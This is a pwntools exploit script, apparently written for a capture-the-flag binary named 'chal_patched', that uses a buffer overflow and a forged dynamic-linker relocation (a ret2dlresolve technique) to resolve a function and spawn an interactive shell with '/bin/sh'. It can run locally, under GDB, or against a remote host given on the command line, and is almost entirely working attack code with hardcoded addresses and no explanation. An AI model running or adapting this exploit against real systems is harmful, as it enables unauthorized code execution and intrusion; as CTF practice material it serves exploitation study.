from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
# context.gdbinit = "/opt/pwndbg/gdbinit"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chal_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+25
    b *0x401026
    b _dl_fixup
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def aenc(x):
    return str(x).encode()

def inject_toxic_feild():
    dynsym = 0x004003e0
    dynstr = 0x00400470
    relaplt = 0x00400590
    bss = 0x00404008
    injectable = bss - 8 + 0x700
    print(hex(injectable))
    gets_plt = 0x404000

    # writing parameter
    log.info(f"fucking injectable {hex(injectable)}")
    toxic_feild = p64( int((injectable + 0x18 - relaplt ) / 0x18 ))     # reloc index
    toxic_feild += (0x18 - 8 - 5) * b"\x00"
    ## starting Elf_Rela
    # definition
    toxic_feild += p64(elf.got.gets)
    toxic_feild += p64((int((injectable + (0x18 * 2) - dynsym ) / 0x18) << 32) | 7 )
    toxic_feild += p64(0)                         # padding
    # ELF_Sym
    toxic_feild += p64((injectable + (0x18 * 3) - dynstr))
    toxic_feild += p16(0x0003)
    toxic_feild += b"\x00" * (0x18 - 10)
    # dynstr
    toxic_feild += b"puts\x00"
    toxic_feild += b"/bin/sh\x00"

    return (toxic_feild)


def exploit():
    log.info("alright")
    main_stub = 0x40112a
    bss = 0x00404008
    plt = 0x401020
    total_injectable = bss - 32 + 0x700          # these are not the toxic feild, its shifted a bit to fucking save another address
                                                # real toxic feild will be in inject toxic feild

    pp.sendline(cyclic(13) + p64(total_injectable + 0xd) + p64(main_stub))
    payload = cyclic(13) + p64(bss - 8 + 0x700) + p64(0x401020) 
    payload += inject_toxic_feild()
    pp.sendline(payload)
    pp.interactive()
    

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("./libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
